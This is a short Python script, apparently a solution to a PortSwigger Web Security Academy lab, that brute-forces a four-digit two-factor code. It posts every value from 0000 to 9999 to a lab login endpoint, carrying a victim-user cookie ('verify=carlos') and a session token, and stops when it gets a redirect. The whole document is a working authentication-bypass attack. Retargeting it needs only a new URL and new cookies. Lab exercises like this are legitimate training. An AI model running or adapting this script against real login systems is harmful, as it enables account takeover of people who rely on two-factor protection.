import requests

url = "https://0a0a002d03baaa8f813207ad00090084.web-security-academy.net/login2"

cookies = {
    "verify": "carlos",
    "session": "gVqcmnWnTXJ8E5sK7iLK8LosSft2oVBp"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

session = requests.Session()
print("[*] Starting the 2FA code brute-force attack...")
for i in range(10000):
    code = f"{i:04d}"
    data = {"mfa-code": code}

    response = session.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"[✓] SUCCESS! Correct code: {code}")
        break

    if i % 100 == 0:
        print(f"[*] Still trying... last tried: {code}")

else:
    print("[x] All attempts failed.")
